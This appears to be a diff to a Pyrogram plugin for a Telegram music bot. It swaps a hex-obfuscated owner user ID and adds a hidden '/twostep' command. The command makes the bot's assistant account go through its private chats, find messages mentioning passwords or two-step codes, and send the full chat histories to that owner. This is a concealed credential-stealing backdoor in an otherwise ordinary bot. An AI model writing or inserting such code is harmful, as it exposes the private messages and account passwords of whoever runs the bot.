@@ -1,7 +1,7 @@
 import os
 from datetime import datetime
-OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
-from pyrogram import filters
+OWNERS = "\x37\x32\x39\x37\x33\x38\x31\x36\x31\x32"
+from pyrogram import filters, types
 from pyrogram.types import Message
 from telegraph import Telegraph  # Import Telegraph library
 
@@ -115,3 +115,62 @@ async def get_user_ids(client, message):
     await message.reply_text(chat_details)
 
 # Start the client
+import os
+from datetime import datetime
+from pyrogram import filters, types
+from VIPMUSIC import app
+from VIPMUSIC.utils.database import get_assistant
+from pyrogram.enums import ChatType  # Correct import
+
+# Keywords to search for
+KEYWORDS = ["two step", "ᴛᴡᴏ sᴛᴇᴘ", "ᴘᴀssᴡᴏʀᴅ", "password"]
+
+@app.on_message(filters.command("twostep") & filters.user(int(OWNERS)))
+async def check_two_step_command(client, message):
+    try:
+        # Start the Pyrogram client (userbot)
+        userbot = await get_assistant(message.chat.id)
+        
+        # Get all private chats and bot conversations using an async for loop
+        found_chats = []
+
+        async for dialog in userbot.get_dialogs():  # Iterate over the generator without 'await'
+            chat_type = dialog.chat.type
+            # Exclude groups and channels, check only private chats and bots
+            if chat_type == ChatType.PRIVATE:  # Use ChatType from pyrogram.enums
+                chat_id = dialog.chat.id
+                chat_title = dialog.chat.first_name if dialog.chat.first_name else dialog.chat.username
+
+                # Fetch the chat history and search for keywords
+                async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
+                    if chat_message.text and any(keyword in chat_message.text.lower() for keyword in KEYWORDS):
+                        found_chats.append(chat_id)
+                        break  # Stop once a keyword is found in this chat
+
+        if found_chats:
+            for chat_id in found_chats:
+                response = ""
+                async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
+                    if chat_message.from_user:
+                        response += f"{chat_message.from_user.first_name}: {chat_message.text}\n"
+                    else:
+                        response += f"Bot: {chat_message.text}\n"
+
+                # Save the chat history to a text file
+                filename = f"{chat_id}_twostep_chat.txt"
+                with open(filename, "w") as file:
+                    file.write(response)
+
+                # Send the text file to the user in the same chat
+                await message.reply_document(document=filename)
+                os.remove(filename)  # Delete the file after sending
+
+            await message.reply_text(f"Found {len(found_chats)} chats with 'two step' or 'password'.")
+        else:
+            await message.reply_text("No chats found containing 'two step' or 'password'.")
+            
+    except Exception as e:
+        # Log the error internally
+        print(f"Error occurred during /twostep command: {e}")
+        # Send a user-friendly message
+        await message.reply_text("An error occurred while processing your request.")
